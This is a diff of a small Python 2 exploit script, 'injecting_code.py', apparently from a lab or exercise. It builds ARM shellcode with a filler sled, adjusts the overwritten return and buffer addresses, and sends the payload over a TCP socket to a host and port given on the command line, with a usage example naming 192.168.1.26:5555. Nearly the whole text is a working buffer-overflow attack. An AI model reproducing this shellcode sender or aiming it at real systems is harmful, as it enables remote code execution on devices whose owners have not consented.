@@ -4,13 +4,20 @@ import sys, socket
 
 shellcode = ("\x01\x10\xa0\xe1"*10
 + "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x0d\x48\x0e\x49\x40\x1a\x41\xf2\x68\x01\x07\x22\x7d\x27\x01\xdf\x07\x33\x18\x47\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x08\x48\x4f\xf0\x80\x71\x40\x1a\x07\x49\x01\x60\x07\x33\x18\x47\x1c\xb0\x8d\xe2\x14\x10\x9f\xe5\x01\xf4\x41\xe2\x02\x21\x11\x01\x02\x01\x10\x01\xc4\x27\x01\x01\x01\x10\xa0\xe1"
-+ "AAAA" + "\xb8\x27\x01\x01"        # return address
++ "AAAA" + "\x80\x2e\x01\x01"        # return address (added last 01)
 + "\x01\x10\xa0\xe1"*43
-+ "AAAA"+"\x3c\xf0\xff\x7e")         # buffer address
++ "AAAA"+"\x74\xf0\xff\x7e")         # buffer address
 
-sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
-sock.connect(( sys.argv[1], int(sys.argv[2]) ))
-sock.send(shellcode)
-sock.close()
 
-print "InjectingCode: Shellcode Length: %d" %len(shellcode)
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print "./injecting_code.py  192.168.1.26  5555"
+    else:
+        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
+        sock.connect(( sys.argv[1], int(sys.argv[2]) ))
+        sock.send(shellcode)
+        sock.close()
+
+        print "InjectingCode: Shellcode Length: %d" %len(shellcode)
